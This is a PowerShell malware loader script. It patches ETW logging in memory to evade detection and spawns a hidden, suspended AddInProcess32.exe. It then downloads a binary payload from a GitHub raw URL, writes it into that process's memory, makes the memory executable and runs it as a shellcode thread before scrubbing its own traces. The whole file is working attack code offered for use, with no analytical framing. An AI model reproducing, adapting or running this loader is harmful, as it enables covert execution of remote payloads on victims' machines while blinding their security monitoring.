#requires -Version 4
<#
.SYNOPSIS
    ENI loader — streams payload into a suspended AddInProcess32 host.
    Small chunks only; never stores the full payload in PowerShell memory.
#>
[CmdletBinding()]
param(
    [string]$Url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin",
    [string]$Target = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe"
)

$ErrorActionPreference = "Stop"

# ---------------------------------------------------------------------------
# P/Invoke layer
# ---------------------------------------------------------------------------
$TypeSource = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class RTI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(IntPtr lpApplicationName, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, int StackZeroBits, int SizeOfStack, int MaximumStackSize, IntPtr AttributeList);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
        public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
        public uint dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
    }

    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READ = 0x20;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint CREATE_SUSPENDED = 0x00000004;
    public const uint CREATE_NO_WINDOW = 0x08000000;
    public const uint THREAD_ALL_ACCESS = 0x1FFFFF;
}
"@

Add-Type -TypeDefinition $TypeSource -Language CSharp -ErrorAction SilentlyContinue | Out-Null

# ---------------------------------------------------------------------------
# Verbose timestamp helpers
# ---------------------------------------------------------------------------
function Get-VerboseTimestamp {
    $now = [DateTime]::Now
    $tz = [System.TimeZoneInfo]::Local.StandardName
    return "[{0:yyyy-MM-dd}] [{0:HH:mm:ss.fff}] [{1}] [{2}]" -f $now, $now.DayOfWeek, $tz
}

function Write-StampedHost {
    param([string]$Message)
    Write-Host "$(Get-VerboseTimestamp) $Message" -ForegroundColor Cyan
}

function Write-StampedHostSuccess {
    param([string]$Message)
    Write-Host "$(Get-VerboseTimestamp) $Message" -ForegroundColor Green
}

function Write-StampedHostWarning {
    param([string]$Message)
    Write-Host "$(Get-VerboseTimestamp) $Message" -ForegroundColor Yellow
}

# ---------------------------------------------------------------------------
# 1. Patch ETW in current PowerShell session
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Locating EtwEventWrite inside ntdll.dll..."
$ntdll = [RTI]::GetModuleHandle("ntdll.dll")
if ($ntdll -eq [IntPtr]::Zero) { throw "Failed to get ntdll.dll module handle" }

$etw = [RTI]::GetProcAddress($ntdll, "EtwEventWrite")
if ($etw -eq [IntPtr]::Zero) { throw "Failed to resolve EtwEventWrite" }

$patch = [byte[]]@(0xC3)
$oldProtect = 0
Write-StampedHost "[*] Patching ETW logging routine at 0x$($etw.ToString('X'))..."
$vp = [RTI]::VirtualProtect($etw, [UIntPtr]::new($patch.Length), [RTI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
if (-not $vp) { throw "VirtualProtect failed while patching ETW" }
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw, $patch.Length)
[void][RTI]::VirtualProtect($etw, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect)
Write-StampedHostSuccess "[+] ETW EventWrite blindfolded in current process"

# ---------------------------------------------------------------------------
# 2. Validate target host
# ---------------------------------------------------------------------------
if (-not (Test-Path -LiteralPath $Target)) { throw "Host not found: $Target" }

# ---------------------------------------------------------------------------
# 3. Create suspended, hidden AddInProcess32 host
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Creating suspended host: $Target"
$si = New-Object RTI+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$si.dwFlags = 1
$si.wShowWindow = 0
$pi = New-Object RTI+PROCESS_INFORMATION

$cmd = [System.Text.StringBuilder]::new("`"$Target`"")
$ok = [RTI]::CreateProcessW([IntPtr]::Zero, $cmd, [IntPtr]::Zero, [IntPtr]::Zero, $false,
    [RTI]::CREATE_SUSPENDED -bor [RTI]::CREATE_NO_WINDOW,
    [IntPtr]::Zero, [IntPtr]::Zero, [ref]$si, [ref]$pi)

if (-not $ok) {
    $err = [RTI]::GetLastError()
    throw "CreateProcessW failed. Error: 0x$($err.ToString('X8'))"
}
Write-StampedHostSuccess "[+] Host spawned. PID=$($pi.dwProcessId) | hProcess=0x$($pi.hProcess.ToString('X')) | hThread=0x$($pi.hThread.ToString('X'))"

# ---------------------------------------------------------------------------
# 4. Stream payload directly into remote RW memory
# ---------------------------------------------------------------------------
try {
    Write-StampedHost "[*] Opening payload stream from $Url ..."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $req = [System.Net.WebRequest]::Create($Url)
    $req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    $resp = $req.GetResponse()
    $stream = $resp.GetResponseStream()
    $total = $resp.ContentLength
    if ($total -le 0) { throw "Could not determine payload size." }
    Write-StampedHostSuccess "[+] Payload size: $total bytes (~$([math]::Round($total/1MB,2)) MB)"

    # Allocate remote memory RW (not RWX)
    Write-StampedHost "[*] Allocating RW memory in host..."
    $base = [IntPtr]::Zero
    $size = [IntPtr]$total
    $status = [RTI]::NtAllocateVirtualMemory($pi.hProcess, [ref]$base, [IntPtr]::Zero, [ref]$size,
        [RTI]::MEM_COMMIT -bor [RTI]::MEM_RESERVE, [RTI]::PAGE_READWRITE)
    if ($status -ne 0) { throw "NtAllocateVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))" }
    Write-StampedHostSuccess "[+] RW buffer: 0x$($base.ToString('X')) [$size bytes]"

    # Stream in chunks, write remotely, scrub chunk immediately
    Write-StampedHost "[*] Streaming payload into host memory..."
    $chunkSize = 65536
    $buf = New-Object byte[] $chunkSize
    $offset = 0
    $writtenTotal = 0
    while (($read = $stream.Read($buf, 0, $chunkSize)) -gt 0) {
        $writeAddr = [IntPtr]::Add($base, $offset)
        $written = 0
        $status = [RTI]::NtWriteVirtualMemory($pi.hProcess, $writeAddr, $buf, [uint32]$read, [ref]$written)
        if ($status -ne 0) { throw "NtWriteVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))" }
        $offset += $written
        $writtenTotal += $written
        [Array]::Clear($buf, 0, $read)
    }
    $stream.Close()
    $resp.Close()
    $buf = $null
    [GC]::Collect()
    Write-StampedHostSuccess "[+] Streamed: $writtenTotal bytes"

    # Flip remote memory to RX
    Write-StampedHost "[*] Protecting buffer RX..."
    $oldProtect = 0
    $status = [RTI]::NtProtectVirtualMemory($pi.hProcess, [ref]$base, [ref]$size, [RTI]::PAGE_EXECUTE_READ, [ref]$oldProtect)
    if ($status -ne 0) { throw "NtProtectVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))" }
    Write-StampedHostSuccess "[+] Buffer now RX"

    # Create thread in host
    Write-StampedHost "[*] Creating shellcode thread via NtCreateThreadEx..."
    $hThread = [IntPtr]::Zero
    $status = [RTI]::NtCreateThreadEx([ref]$hThread, [RTI]::THREAD_ALL_ACCESS, [IntPtr]::Zero,
        $pi.hProcess, $base, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
    if ($status -ne 0) { throw "NtCreateThreadEx failed. NTSTATUS: 0x$($status.ToString('X8'))" }
    Write-StampedHostSuccess "[+] Thread born. hThread=0x$($hThread.ToString('X'))"

    # Detach
    Write-StampedHost "[*] Shellcode executing. Main thread remains suspended."
    [void][RTI]::CloseHandle($hThread)
}
finally {
    [void][RTI]::CloseHandle($pi.hThread)
    [void][RTI]::CloseHandle($pi.hProcess)
}

# ---------------------------------------------------------------------------
# 5. Scrub local footprint
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Forcing garbage collection..."
$TypeSource = $null
$cmd = $null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()
[GC]::Collect()
Write-StampedHostSuccess "[+] Local memory footprint erased"

Write-StampedHostSuccess "[+] Injection sequence complete"
